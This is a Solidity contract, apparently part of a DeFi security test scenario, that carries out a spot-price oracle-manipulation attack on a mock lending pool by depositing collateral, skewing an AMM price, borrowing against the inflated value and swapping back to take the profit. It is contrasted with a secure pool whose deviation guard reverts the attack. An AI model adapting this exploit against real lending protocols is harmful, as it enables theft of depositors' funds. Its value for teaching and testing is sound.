// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {MockAMM} from "../../common/MockAMM.sol";
import {MockERC20} from "../../common/MockERC20.sol";
import {ILending} from "./ILending.sol";

/**
 * @title Attacker
 * @notice Oracle-manipulation attacker for scenario S4.
 * @dev The attacker deposits a little collateral, swaps a large stack of the
 *      borrow token into the AMM to drive the collateral's spot price up,
 *      borrows against the inflated valuation, then swaps the collateral it
 *      received back into the borrow token to undo the skew. Against
 *      {VulnerableLending} it walks away with more borrow tokens than the
 *      honest LTV would ever have allowed; against {SecureLending} the
 *      manipulated price trips the deviation guard and the whole attack
 *      reverts.
 *
 *      The attacker is funded with collateral and borrow tokens by the caller
 *      before {attack} runs. Every intermediate figure is exposed as public
 *      state so the run can be inspected without decoding logs.
 */
contract Attacker {
    using SafeERC20 for MockERC20;

    /// @notice Fixed-point scale of the pool price.
    uint256 private constant PRICE_SCALE = 1e18;

    /// @notice Lending pool being attacked.
    ILending public immutable pool;

    /// @notice AMM the pool prices collateral from.
    MockAMM public immutable amm;

    /// @notice Collateral token (AMM token0); also the token being pumped.
    MockERC20 public immutable collateralToken;

    /// @notice Borrow token (AMM token1); the token spent to skew the price.
    MockERC20 public immutable borrowToken;

    /// @notice Pool price recorded before the skew.
    uint256 public priceBefore;

    /// @notice Pool price recorded immediately after the skew.
    uint256 public priceAfter;

    /// @notice Borrow tokens swapped in to skew the pool.
    uint256 public swapIn;

    /// @notice Collateral tokens received from the skew swap.
    uint256 public collateralReceived;

    /// @notice Borrow tokens recovered by swapping the collateral back.
    uint256 public swapBack;

    /// @notice Amount borrowed against the inflated collateral.
    uint256 public borrowed;

    uint256 private _profit;

    error ZeroTarget();
    error MissingSeed();

    /**
     * @param target address of the lending pool to attack
     */
    constructor(address target) {
        if (target == address(0)) {
            revert ZeroTarget();
        }
        pool = ILending(target);
        amm = MockAMM(pool.amm());
        collateralToken = amm.token0();
        borrowToken = amm.token1();
    }

    /**
     * @notice Run the manipulation: deposit, skew, borrow, swap back.
     * @dev Uses whatever collateral and borrow tokens the contract already
     *      holds, so the caller seeds the attack by transferring funds in.
     */
    function attack() external {
        uint256 collateralDeposited = collateralToken.balanceOf(address(this));
        if (collateralDeposited == 0) {
            revert MissingSeed();
        }

        priceBefore = pool.price();

        collateralToken.forceApprove(address(pool), collateralDeposited);
        pool.depositCollateral(collateralDeposited);

        // Skew the pool: buy collateral with borrow tokens, pushing the spot
        // price of collateral up.
        swapIn = borrowToken.balanceOf(address(this));
        borrowToken.forceApprove(address(amm), swapIn);
        collateralReceived = amm.swap(0, swapIn, 0, address(this));
        priceAfter = pool.price();

        // Borrow the largest amount the inflated price allows.
        borrowed = pool.maxBorrow(address(this));
        pool.borrow(borrowed);

        // Swap the collateral acquired from the skew back to borrow tokens,
        // restoring the pool price so the manipulation leaves no trace.
        collateralToken.forceApprove(address(amm), collateralReceived);
        swapBack = amm.swap(collateralReceived, 0, 0, address(this));

        // Net gain is the borrow tokens on hand above the starting stack, less
        // the collateral we wrote off, valued at the pre-attack (honest) price.
        uint256 finalBalance = borrowToken.balanceOf(address(this));
        uint256 gained = finalBalance > swapIn ? finalBalance - swapIn : 0;
        uint256 writeOff = (collateralDeposited * priceBefore) / PRICE_SCALE;
        _profit = gained > writeOff ? gained - writeOff : 0;
    }

    /**
     * @notice Net borrow-token profit extracted by the attack.
     */
    function profit() external view returns (uint256) {
        return _profit;
    }
}
